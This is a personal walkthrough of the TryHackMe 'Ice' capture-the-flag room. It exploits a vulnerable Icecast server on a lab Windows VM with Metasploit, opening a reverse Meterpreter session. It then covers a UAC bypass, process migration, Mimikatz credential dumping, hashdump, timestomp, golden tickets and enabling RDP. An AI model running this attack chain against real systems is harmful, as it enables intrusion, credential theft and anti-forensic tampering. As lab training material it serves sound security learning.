<p align="center">December 8, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{216}}$$-day-streak in  <a href="https://tryhackme.com/">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Ice}}$$
</h1>
<p align="center">Deploy & hack into a Windows machine, exploiting a very poorly secured media server.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/ice">Ice</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/26afa9d5-2b53-4897-aa55-b9d2a89958d6"><br>
  <img width="800px" src="https://github.com/user-attachments/assets/d617512b-d5c9-41e9-b943-db84a17abf19">
</p>

<br>
<h2>Task 1. Connect<a id='1'></a></h2>

<p align="center">Connect to the TryHackMe network! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.</p>

<br>

<p align="center">-----------------------------------------</p>


<br>

<p align="center">The virtual machine used in this room (Ice) can be downloaded for offline usage from https://darkstar7471.com/resources.html. The sequel to this room, Blaster, can be found here.</p>


<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<p>Connect to our network using OpenVPN. Here is a mini walkthrough of connecting:<br>

Go to your access page and download your configuration file.</p>

<p align="center"> <img width="400px" src="https://github.com/user-attachments/assets/9429b290-c5f4-4ef9-9d9a-2d8ad6963347"> </p>

>> <code><strong>No answer needed</strong></code>

<br>

<p>Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.</p>

<p align="center"> <img width="600px" src="https://github.com/user-attachments/assets/d2f7f13e-e2b9-49d7-8a57-b24e2625d4dd"> </p>

<p>When you run this you see lots of text, at the end it will say Initialization Sequence Completed</p>

>> <code><strong>No answer needed</strong></code>

<p>You can verify you are connected by looking on your access page. Refresh the page.<br>

You should see a green tick next to Connected. It will also show you your internal IP address.</p>

<p align="center"> <img width="400px" src="https://github.com/user-attachments/assets/9053d4b9-9afc-455e-bf42-6920752b5777"> </p>

<p>You are now ready to use our machines on our network!</p>

>> <code><strong>No answer needed</strong></code>

<p>Now when you deploy material, you will see an internal IP address of your Virtual Machine.</p>

>> <code><strong>No answer needed</strong></code>

<br>
<br>
<h2>Task 2. Recon<a id='2'></a></h2>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/9951bf17-6de4-4cc5-8d42-ca1f16156129"> </p>

<p align="center">Scan and enumerate our victim!.</p>



<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 2.1. <em>Deploy the machine! This may take up to three minutes to start.</em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 2.2. <em>Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'Nmap' prior to this room. </em><br><a id='2.2'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 2.3. <em>Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?</em><br><a id='2.3'></a>
>> <code><strong>3389</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/3671268a-fbe9-4a01-a7d7-5f140af830b9"> </p>

<br>


> 2.4. <em>What service did nmap identify as running on port 8000? (First word of this service)</em><br><a id='2.4'></a>
>> <code><strong>Icecast</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/e5de7b0f-6ff4-4632-84f7-3eedde43a1ab"> </p>


<br>

> 2.5. <em>What does Nmap identify as the hostname of the machine? (All caps for the answer).</em><br><a id='2.5'></a>
>> <code><strong>DARK-PC</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/29738585-4f3a-4263-85f9-e704f42d2012"> </p>


<br>
<br>
<h2>Task 3. Gain Access<a id='3'></a></h2>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/45b69899-8f2a-453e-ab2b-d2565b9ca0e9"> </p>

<p align="center">Exploit the target vulnerable service to gain a foothold!</p>

<br>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 3.1. <em>Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the Impact Score for this vulnerability? Use https://www.cvedetails.com for this question and the next.</em><br><a id='3.1'></a>
>> <code><strong>6.4</strong></code>

<br>

<p align="center"> <img width="300px" src="https://github.com/user-attachments/assets/5149dc21-65fe-4477-8c2f-6d1176f81f49"> </p>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/34ae76a0-1b9d-4191-bc3d-a9dff6e0b789"> </p>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/78a1b2c9-4666-4d6b-a201-44c021e76114"> </p>


<br>


> 3.2. <em>What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000</em><br><a id='3.2'></a>
>> <code><strong>CVE-2004-1561</strong></code>

<br>

> 3.3. <em>Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`</em><br><a id='3.3'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p>Before running <code>msfconsole</code>, I run <code>msfupdate</code>.</p>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/89a6b84d-a8a7-4cf6-ad90-194695bfd3eb"> </p>

<br>

> 3.4. <em>After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the Metasploit module.`</em><br><a id='3.4'></a>
>> <code><strong>exploit/windows/http/icecast_header</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/f89325d5-d5a2-49a6-9ac4-ba20ffe3b0b2"> </p>

<br>


> 3.5. <em>Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.</em><br><a id='3.5'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/043ded45-c9d2-4e77-a86a-c923457b0301"> </p>

<br>

> 3.6. <em>Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?</em><br><a id='3.6'></a>
>> <code><strong>rhosts</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/ae351dd3-c4e7-488d-9684-e2396fb2a298"> </p>

<br>

> 3.7. <em>First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`</em><br><a id='3.7'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<pre><code>msf6 exploit(windows/http/icecast_header) > set RHOSTS [Target]
RHOSTS => [Target]
msf6 exploit(windows/http/icecast_header) > 
</code></pre>

<br>

<br>
<br>
<h2>Task 4. Escalate<a id='4'></a></h2>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/458c28bf-9d68-44d0-b420-6136ff40ea6f"> </p>

<p align="center">Enumerate the machine and find potential privilege escalation paths to gain Admin powers!</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 4.1. <em>Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?</em><br><a id='4.1'></a>
>> <code><strong>meterpreter</strong></code>

<br>

<pre><code>msf6 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on [THM AttackBox IP]:[THM AttackBox Port] 
[*] Sending stage (177734 bytes) to [Target]
[*] Meterpreter session 1 opened ([THM AttackBox IP]:[THM AttackBox Port] -> [Target IP]:[Target Port]) at 2024-12-08 18:48:31 +0000

meterpreter ></code></pre>

<br>

> 4.2. <em>What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module.</em><br><a id='4.2'></a>
>> <code><strong>dark</strong></code>

<br>

<pre><code>meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter ></code></pre>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/25d99952-bdcd-4a8e-90d1-563ddeb13a27"> </p>


<br>

> 4.3. <em>What build of Windows is the system?</em><br><a id='4.3'></a>
>> <code><strong>7601</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/04dceb8d-37d6-49d1-a79a-dc8dc7f23d4a"> </p>


<br>

> 4.4. <em>Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?</em><br><a id='4.4'></a>
>> <code><strong>x64</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/e654c39c-7e38-4de6-824d-d4aea50890d0"> </p>

<br>

> 4.5. <em>Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*</em><br><a id='4.5'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/5cf9fffe-98b8-49a5-b387-be90ef749018"> </p>


<br>

> 4.6. <em>Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?</em><br><a id='4.6'></a>
>> <code><strong>exploit/windows/local/bypassuac_eventvwr</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/06704539-bfe8-473e-b88d-86fc77c9dbdc"> </p>


<br>

> 4.7. <em>Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.</em><br><a id='4.7'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<pre><code>meterpreter > meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  [THM AttackBox IP]:[THM AttackBox Port] -> [Target IP]:[Target Port] ([Target IP])

msf6 exploit(windows/http/icecast_header) > 
</code></pre>

<br>

> 4.8. <em>Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`.</em><br><a id='4.8'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<pre><code>meterpreter > msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > 
</code></pre>

<br>

> 4.9. <em>Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`.</em><br><a id='4.9'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<pre><code>msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [THM AttackBox IP]    yes       The listen address (an interface may be specified)
   LPORT     [THM AttackBox Port]              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_eventvwr) > 
</code></pre>


<br>

> 4.10. <em>Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?</em><br><a id='4.10'></a>
>> <code><strong>LHOST</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/01be97a2-9236-4cf8-8aa8-caca8bf0309e"> </p>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/0f5fefb5-451e-47c2-bb2c-1123666627cb"> </p>

<br>

> 4.11. <em>Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`?</em><br><a id='4.11'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 4.12. <em>After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. </em><br><a id='4.12'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/41879708-38bb-4da0-8dbb-5143a4ba59a3"> </p>

<br>

> 4.13. <em>Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER` </em><br><a id='4.13'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 4.14. <em>We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?</em><br><a id='4.14'></a>
>> <code><strong>SeTakeOwnershipPrivilege</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/1c03d0eb-9d6f-4830-a599-44e40c49735d"> </p>

<br>
<br>
<h2>Task 5. Looting<a id='5'></a></h2>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/b56b8bbe-e891-4c67-86df-ef0d29c2de40"> </p>

<p align="center">Learn how to gather additional credentials and crack the saved hashes on the machine</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 5.1. <em>Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). </em><br><a id='5.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/8bdc8f18-f5c8-4810-8cc4-7a3e5daa23f4"> </p>

<br>

> 5.2. <em>In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?<br>

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. . </em><br><a id='5.2'></a>
>> <code><strong>spoolsv.exe</strong></code>

<br>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/ca261de2-a52a-423c-a361-c6c8b4ae43d5"> </p>

<br>


<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/8f69832b-1419-424b-a6a7-dfa08f62ee05"> </p>


<br>


> 5.3. <em>Migrate to this process now with the command `migrate -N PROCESS_NAME` </em><br><a id='5.3'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/61ddd2de-47bc-4cb9-9b67-3e55eee24a035"> </p>

<br>


> 5.4. <em>Let's check what user we are now with the command `getuid`. What user is listed? </em><br><a id='5.4'></a>
>> <code><strong>NT AUTHORITY\SYSTEM</strong></code>

<br>

<pre><code>meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM</code></pre>

<br>

> 5.5. <em>Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)</em><br><a id='5.5'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<pre><code>meterpreter> load kiwi
</code></pre>

<br>
> 5.6. <em>Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. </em><br><a id='5.6'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 5.7. <em>Which command allows up to retrieve all credentials?</em><br><a id='5.7'></a>
>> <code><strong>creds_all</strong></code>

<br>

> 5.8. <em>Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)</em><br><a id='5.8'></a>
>> <code><strong>Password01</strong></code>

<br>


<br>
<br>
<h2>Task 6. Post-Exploitation<a id='6'></a></h2>
<p align="center">Explore post-exploitation actions we can take on Windows.</p>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/3778db03-267d-48b4-ad48-0c0b6ce61ea4"> </p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 6.1. <em>Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.</em><br><a id='6.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 6.2. <em>What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts). </em><br><a id='6.2'></a>
>> <code><strong>hashdump</strong></code>

<br>

> 6.3. <em>While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?</em><br><a id='6.3'></a>
>> <code><strong>screenshare</strong></code>

<br>

> 6.4. <em>How about if we wanted to record from a microphone attached to the system?</em><br><a id='6.4'></a>
>> <code><strong>record_mic</strong></code>

<br>

> 6.5. <em>To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.</em><br><a id='6.5'></a>
>> <code><strong>timestomp</strong></code>

<br>

> 6.6. <em>Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?<br>

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain. </em><br><a id='6.6'></a>
>> <code><strong>golden_ticket_create</strong></code>

<br>

> 6.7. <em>One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`</em><br><a id='6.7'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<br>
<h2>Task 7. Extra Credit<a id='7'></a></h2>
<p align="center">Explore manual exploitation via exploit code found on exploit-db.<br>
Exploit link: https://www.exploit-db.com/exploits/568</p>

<p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/23bc0cc8-22ce-4cd9-9a3c-87e3f937a696"> </p>

<p align="center">To learn more about alternative exploitation methods, check out the sequel to this room Blaster!</p>


<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 7.1. <em>As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.</em><br><a id='7.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>


<br>
<br>
<h2>Room Completed<a id='8'></a></h2>
<p>Keep learning, keep growing!<br>


<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/e40b6790-d747-4381-b459-dfcee5401e2e"> </p>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/1c54a7b9-8357-4153-9e74-c6d745813125"> </p>



<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 8, 2024  | 216      |     1,005 th |        21 st |    5,372 nd |      55 th |  59,964  |       459 |

</div>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/f54957fc-83f5-4290-93e4-5c4509b8d107"> </h3>
